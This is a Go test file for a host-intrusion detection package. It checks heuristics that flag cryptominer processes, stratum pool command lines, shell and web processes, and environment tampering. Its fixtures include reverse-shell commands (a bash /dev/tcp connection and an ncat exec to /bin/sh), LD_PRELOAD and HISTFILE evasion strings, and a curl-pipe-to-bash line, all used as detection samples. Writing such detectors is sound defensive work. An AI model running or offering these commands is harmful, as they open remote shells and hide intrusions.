package process

import "testing"

func TestIsMiner(t *testing.T) {
	miners := []string{
		"xmrig", "minerd", "kdevtmpfsi", "kinsing", "t-rex",
		"nbminer", "lolminer", "phoenixminer", "gminer", "cgminer",
	}
	for _, m := range miners {
		if !isMiner(m) {
			t.Errorf("isMiner(%q) = false, want true", m)
		}
	}

	if !isMiner("XMRig") {
		t.Errorf("isMiner case-insensitive failed")
	}

	legit := []string{
		"sshd", "nginx", "systemd", "bash", "node",
		"python3", "postgres", "redis-server", "java",
	}
	for _, n := range legit {
		if isMiner(n) {
			t.Errorf("isMiner(%q) = true, want false", n)
		}
	}
}

func TestCmdlineHasMiner(t *testing.T) {
	cases := []struct {
		cmdline string
		want    bool
	}{
		{"/var/tmp/xmrig --donate-level 1", true},
		{"./minerd -o stratum+tcp://pool.example.com:3333", true},
		{"sh -c 'curl bad | bash'", false},
		{"kdevtmpfsi worker", true},
		{"some_random_app --pool stratum+ssl://x.y:5555", true},
		{"nginx: master process /usr/sbin/nginx", false},
		{"sshd: root@pts/0", false},
		{"", false},
	}
	for _, c := range cases {
		if got := cmdlineHasMiner(c.cmdline); got != c.want {
			t.Errorf("cmdlineHasMiner(%q) = %v, want %v", c.cmdline, got, c.want)
		}
	}
}

func TestBaseName(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"/usr/bin/sshd", "sshd"},
		{"/var/tmp/.ICE-unix/xmrig", "xmrig"},
		{"sshd", "sshd"},
		{"", ""},
		{"/", ""},
	}
	for _, c := range cases {
		if got := baseName(c.in); got != c.want {
			t.Errorf("baseName(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestProcessHeuristics(t *testing.T) {
	if !isShell("bash") || isShell("sshd") {
		t.Fatal("shell heuristic failed")
	}
	if !isWebProcess("php-fpm") || !isWebProcess("nginx: worker process") {
		t.Fatal("web process heuristic failed")
	}
	if isWebProcess("sshd") {
		t.Fatal("sshd must not be a web process")
	}
	if suspiciousEnv("USER=x LD_PRELOAD=/tmp/x.so") != "ld_preload" {
		t.Fatal("LD_PRELOAD env tamper not detected")
	}
	if suspiciousEnv("HISTFILE=/dev/null") != "histfile_dev_null" {
		t.Fatal("HISTFILE env tamper not detected")
	}
	if suspiciousCommand("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1") != "dev_tcp_reverse_shell" {
		t.Fatal("reverse shell command not detected")
	}
	if suspiciousCommand("ncat 1.2.3.4 4444 --exec /bin/sh") != "ncat_exec" {
		t.Fatal("ncat exec not detected")
	}
}
